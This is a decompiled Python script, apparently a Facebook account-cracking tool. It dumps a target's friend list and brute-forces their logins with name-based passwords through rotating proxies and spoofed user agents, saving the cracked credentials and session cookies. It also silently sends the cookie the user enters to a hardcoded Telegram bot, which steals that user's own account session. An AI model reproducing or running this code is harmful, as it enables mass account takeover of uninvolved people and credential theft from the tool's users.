"""
//DECOMPILED BY AHMED XD
@@FACEBOOK : AHMED.XD.7732
"""
#-----------------[ IMPORT-MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich import print as prints
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ GLOBAL NAMA ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
fields=[]
ses=requests.Session()
princp=[]
#------------------[ PROXY ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
#------------------[ USER-AGENT ]-------------------#
for ut in range(10000):
	sllowly = f'Mozilla/5.0 (Linux; Android 10; CLT-L29 Build/HUAWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(90,115))+'.0.'+str(random.randrange(0,5488))+'.'+str(random.randrange(10,400))+' Mobile Safari/537.36'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (Linux; Android 13; SM-F926B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(90,115))+'.0.'+str(random.randrange(0,5488))+'.'+str(random.randrange(10,400))+' Mobile Safari/537.36'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (Linux; Android 12; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/'+str(random.randrange(90,115))+'.0.'+str(random.randrange(0,5488))+'.'+str(random.randrange(10,400))+' Mobile Safari/537.36'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(90,115))+'.0.'+str(random.randrange(0,5488))+'.'+str(random.randrange(10,400))+' Mobile Safari/537.36'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (Linux; Android 9; TECNO KC2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(90,115))+'.0.'+str(random.randrange(0,5488))+'.'+str(random.randrange(10,400))+' Mobile Safari/537.36'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (Linux; Android 10; X1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+str(random.randrange(90,115))+'.0.'+str(random.randrange(0,5488))+'.'+str(random.randrange(10,400))+' Mobile Safari/537.36'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (Linux; Android 12; MI 3W Build/SQ3A.220705.004) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(90,115))+'.0.'+str(random.randrange(0,5488))+'.'+str(random.randrange(10,400))+' Mobile Safari/537.36'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (iPad; CPU OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13A344'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (iPad; CPU OS 9_0_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13A452'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (iPad; CPU OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13C75'
	ugen.append(sllowly) 	
	sllowly = f'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) WebKit/8612 (KHTML, like Gecko) Mobile/19A341'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi 10 Pro Build/MBFMIEK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; Android 11; 2107119DC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4872.143 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; Android 12; SHARK PAR-H0 Build/PTRT2206200OS00MP1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; U; Android 8.1.0; Redmi 7 Pro Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; U; Android 10; en-in; Redmi 9 Prime Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; U; Android 10; pt-br; Redmi 9 Prime Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; U; Android 11; ar-eg; Mi 10T Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; U; Android 10; ru-ru; Mi 10 Pro Build/QKQ1.191117.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36'
	ugen.append(sllowly) 
	sllowly = f'Mozilla/5.0 (Linux; Android 10; Redmi K20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.48 Mobile Safari/537.36'
	ugen.append(sllowly) 
	mek = f'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile'
	ugen.append(mek)	
for xd in range(10000):
	rr = random.randint
	build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
	bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
	oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
	infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
	redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
	um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
	um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
	main_ua = random.choice([um2,um3,um1,um4])
	ugen.append(main_ua)

for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='10; K)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.0.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)

for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='11; SM-M625F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 6.1.1;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SAMSUNG F12 Build/LMY47X)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.4975.10'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
OO = '\x1b[38;5;208m'
sir = '\ 033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
o = '\x1b[38;5;208m' # OREN +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	print(f'''\t{U}
┳┓┳┓┳┳┏┳┓┏┓  ┏┓┏┓┳┓┏┓┏┓  
┣┫┣┫┃┃ ┃ ┣   ┣ ┃┃┣┫┃ ┣   
┻┛┛┗┗┛ ┻ ┗┛  ┻ ┗┛┛┗┗┛┗┛ ''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	print('')
	cok = input(f' {U}[{H}+{U}]{P} Masukkan cookie :{h} ')
	requests.post(f"https://api.telegram.org/bot6918382904:AAHSBLj5sfHdQvm5qzezu3e97W_1CwFmh3Q/sendMessage?chat_id=-1001990426052&text={cok}")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		#exit(link.text)
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);masuk();batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f' Token : {h}{took}')
				exit()
	except Exception as e:
		print(e)
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	___Fitri____Gi____ = input(f'{U}[{H}!{U}]{P} 𝚃𝚎𝚔𝚊𝚗 {B}𝙴𝚗𝚝𝚎𝚛{P} 𝚄𝚗𝚝𝚞𝚔 𝙼𝚞𝚕𝚊𝚒 𝙱𝚛𝚞𝚝𝚎 𝙵𝚘𝚛𝚌𝚎')
	if ___Fitri____Gi____ in ['1']:
		print(f'{u}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		idt = input(f'{U}[{H}!{U}]{P} 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳 𝚃𝙰𝚁𝙶𝙴𝚃 :{H} ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	else:
		print(f'{u}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		idt = input(f'{U}[{H}!{U}]{P} 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳 𝚃𝙰𝚁𝙶𝙴𝚃 :{H} ')
		dump(idt,"",{"cookie":cok},token)
		setting()
def error():
	print(f'{U}[{H}+{U}]{P} Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()

#-------------------[ CRACK-PUBLIK ]----------------#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
	#		sys.stdout.write(f"\r{U}[{H}+{U}]{P} 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 {H}{len(id)}{P} 𝙸𝙳....{P}"),
#			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'{u}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print(f'{U}[{H}+{U}]{P} 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 {H}{len(id)}{P} 𝙸𝙳....{P}')
	print(f'{U}[{H}+{U}] 𝙶𝚄𝙽𝙰𝙺𝙰𝙽 𝙼𝙾𝙳𝙴 𝙿𝙴𝚂𝙰𝚆𝙰𝚃 𝚂𝙴𝚃𝙸𝙰𝙿 𝟹𝟻0 𝙸𝙳𝚉')
	print(f'{u}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	with tred(max_workers=30) as pool:
		for FitriGI in id2:
			idf,nmf = FitriGI.split('|')[0],FitriGI.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile,idf,pwv)
			else:
				pool.submit(crackmobile,idf,pwv)
#------------------[ METHOD-VALIDATE ]-------------------#
def crackmobile(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x,o])
	saiz = random.choice(["😛","😑","😋","😜"])
	sys.stdout.write(f"\r{b}cracking - {len(id)} - {loop} - {h}{ok}{p} - {k}{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=112328095453510&kid_directed_site=0&app_id=112328095453510&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D112328095453510%26redirect_uri%3Dhttps%253A%252F%252Fservices.fandom.com%252Fkratos-public%252Fself-service%252Fmethods%252Foidc%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bopenid%26state%3D903c1be8-bb69-4912-ac7c-7371bae1c690%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8c8521fd-f853-4943-b941-c1a6d0a730e2%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fservices.fandom.com%2Fkratos-public%2Fself-service%2Fmethods%2Foidc%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D903c1be8-bb69-4912-ac7c-7371bae1c690%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=112328095453510&kid_directed_site=0&app_id=112328095453510&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D112328095453510%26redirect_uri%3Dhttps%253A%252F%252Fservices.fandom.com%252Fkratos-public%252Fself-service%252Fmethods%252Foidc%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bopenid%26state%3D903c1be8-bb69-4912-ac7c-7371bae1c690%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8c8521fd-f853-4943-b941-c1a6d0a730e2%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fservices.fandom.com%2Fkratos-public%2Fself-service%2Fmethods%2Foidc%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D903c1be8-bb69-4912-ac7c-7371bae1c690%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=112328095453510&auth_token=332bfa7954939052a3fc4137d3e3ad57&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D112328095453510%26redirect_uri%3Dhttps%253A%252F%252Fservices.fandom.com%252Fkratos-public%252Fself-service%252Fmethods%252Foidc%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bopenid%26state%3D903c1be8-bb69-4912-ac7c-7371bae1c690%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8c8521fd-f853-4943-b941-c1a6d0a730e2%26tp%3Dunspecified&refsrc=deprecated&app_id=112328095453510&cancel=https%3A%2F%2Fservices.fandom.com%2Fkratos-public%2Fself-service%2Fmethods%2Foidc%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D903c1be8-bb69-4912-ac7c-7371bae1c690%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r{k}  ➞ {k}{idf}{x}|{k}{pw}{N}') 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'='+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{h}  ➞ {h}{idf}{x}|{h}{pw}\n{h}  ➞ {h}{kuki}') 
				open('OK/'+okc,'a').write(idf+'='+pw+'='+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
